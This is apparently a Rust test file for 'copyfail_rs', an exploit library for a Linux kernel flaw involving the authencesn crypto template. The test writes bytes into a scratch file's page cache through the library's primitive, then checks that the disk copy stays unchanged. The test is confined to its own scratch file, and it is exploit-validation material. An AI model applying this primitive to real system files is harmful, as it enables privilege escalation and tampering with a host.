use copyfail_rs::{check_kernel, CopyFail};
use std::ffi::CString;
use std::fs;
use std::path::PathBuf;

fn target_dir() -> PathBuf {
    let mut p = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    p.push("target");
    let _ = fs::create_dir_all(&p);
    p
}

fn skip_if_not_vulnerable() -> bool {
    match check_kernel() {
        Ok(s) => {
            if !s.authencesn_template {
                eprintln!("SKIP: authencesn template not present in /proc/crypto");
                return true;
            }
            false
        }
        Err(_) => {
            eprintln!("SKIP: could not read /proc/crypto");
            true
        }
    }
}

#[test]
fn primitive_mutates_page_cache_not_disk() {
    if cfg!(not(target_os = "linux")) {
        return;
    }
    if skip_if_not_vulnerable() {
        return;
    }

    let path = target_dir().join("copyfail-test-scratch.bin");
    fs::write(&path, vec![b'A'; 4096]).expect("write scratch");
    let f = fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open(&path)
        .expect("open scratch");
    f.sync_all().expect("sync_all");
    drop(f);

    let mut prim = match CopyFail::new() {
        Ok(p) => p,
        Err(e) => {
            eprintln!("SKIP: CopyFail::new failed: {:?}", e);
            return;
        }
    };

    let payload: Vec<u8> = b"BBBBCCCC".to_vec();

    let target_path = CString::new(path.as_os_str().as_encoded_bytes()).unwrap();
    let target_fd = unsafe { libc::open(target_path.as_ptr(), libc::O_RDWR) };
    assert!(target_fd >= 0, "open target_fd failed");

    let result = prim.write_buffer(target_fd, &payload);
    if let Err(e) = result {
        unsafe {
            libc::close(target_fd);
        }
        eprintln!(
            "SKIP: write_buffer returned {:?} (likely patched kernel)",
            e
        );
        return;
    }

    // mmap-side: page cache view
    unsafe {
        let map = libc::mmap(
            std::ptr::null_mut(),
            4096,
            libc::PROT_READ,
            libc::MAP_SHARED,
            target_fd,
            0,
        );
        assert!(!map.is_null() && map != libc::MAP_FAILED, "mmap failed");
        let slice = std::slice::from_raw_parts(map as *const u8, 4096);
        let head = &slice[..8];
        eprintln!("mmap head: {:?}", head);
        assert_eq!(head, b"BBBBCCCC", "page cache should reflect mutation");
        libc::munmap(map, 4096);
    }

    // O_DIRECT side: disk view
    let disk_bytes = read_disk(&path);
    eprintln!("disk head:  {:?}", &disk_bytes[..8]);
    assert_eq!(&disk_bytes[..8], &[b'A'; 8], "disk should be untouched");

    unsafe {
        libc::close(target_fd);
    }
    let _ = fs::remove_file(&path);
}

fn read_disk(path: &std::path::Path) -> Vec<u8> {
    let cpath = CString::new(path.as_os_str().as_encoded_bytes()).unwrap();
    unsafe {
        let fd = libc::open(cpath.as_ptr(), libc::O_RDONLY | libc::O_DIRECT);
        if fd >= 0 {
            let buf = AlignedBox::new(4096);
            let n = libc::read(fd, buf.ptr() as *mut _, 4096);
            libc::close(fd);
            assert!(n > 0, "O_DIRECT read returned {}", n);
            return buf.into_vec(n as usize);
        }
        let errno = *libc::__errno_location();
        if errno != libc::EINVAL {
            panic!("O_DIRECT open failed errno {}", errno);
        }
        // Fallback: posix_fadvise DONTNEED + plain read
        let fd2 = libc::open(cpath.as_ptr(), libc::O_RDONLY);
        assert!(fd2 >= 0);
        libc::posix_fadvise(fd2, 0, 0, libc::POSIX_FADV_DONTNEED);
        let mut v = vec![0u8; 4096];
        let n = libc::read(fd2, v.as_mut_ptr() as *mut _, v.len());
        libc::close(fd2);
        assert!(n > 0);
        v.truncate(n as usize);
        v
    }
}

struct AlignedBox {
    p: *mut u8,
    layout: std::alloc::Layout,
}

impl AlignedBox {
    fn new(size: usize) -> Self {
        let layout = std::alloc::Layout::from_size_align(size, 4096).unwrap();
        let p = unsafe { std::alloc::alloc_zeroed(layout) };
        assert!(!p.is_null());
        AlignedBox { p, layout }
    }
    fn ptr(&self) -> *mut u8 {
        self.p
    }
    fn into_vec(self, n: usize) -> Vec<u8> {
        let s = unsafe { std::slice::from_raw_parts(self.p, n) };
        s.to_vec()
    }
}

impl Drop for AlignedBox {
    fn drop(&mut self) {
        unsafe {
            std::alloc::dealloc(self.p, self.layout);
        }
    }
}
